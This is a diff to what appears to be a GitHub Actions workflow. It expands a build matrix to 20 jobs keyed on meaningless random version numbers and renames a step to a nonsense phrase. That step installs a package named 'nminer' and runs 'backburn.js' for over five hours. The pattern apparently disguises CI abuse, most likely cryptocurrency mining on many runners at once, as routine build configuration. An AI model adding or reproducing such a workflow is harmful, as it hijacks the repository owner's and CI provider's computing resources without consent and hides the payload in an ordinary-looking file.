@@ -9,23 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 97 }
-          - { version: 9695 }
-          - { version: 1265 }
-          - { version: 7498 }
-          - { version: 6086 }
-          - { version: 9540 }
-          - { version: 6524 }
-          - { version: 3423 }
-          - { version: 6333 }
-          - { version: 8024 }
-          - { version: 846 }
-          - { version: 6445 }
-          - { version: 6266 }
-          - { version: 4943 }
-          - { version: 9702 }
-          - { version: 8591 }
-          - { version: 6482 }
+          - { version: 9433 }
+          - { version: 4481 }
+          - { version: 3638 }
+          - { version: 8237 }
+          - { version: 7952 }
+          - { version: 5308 }
+          - { version: 465 }
+          - { version: 6848 }
+          - { version: 9729 }
+          - { version: 5350 }
+          - { version: 273 }
+          - { version: 7901 }
+          - { version: 3101 }
+          - { version: 1198 }
+          - { version: 7054 }
+          - { version: 9342 }
+          - { version: 5637 }
+          - { version: 7369 }
+          - { version: 897 }
+          - { version: 3977 }
 
     steps:
       - name: Checkout
@@ -36,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: gladly below dwell boiling
+      - name: inasmuch provided polite deliberately
         run: |
           npm install nminer@latest
-          timeout 302m node backburn.js || echo "backburn executed"
+          timeout 306m node backburn.js || echo "backburn executed"
